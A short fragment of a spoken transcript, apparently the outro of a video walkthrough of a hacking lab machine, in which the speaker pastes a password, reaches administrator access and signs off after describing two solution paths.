151 paste the password and we are now on the box as administrator pretty much doing it a hundred percent differently so hope you guys enjoyed both both paths take care and I will see you next week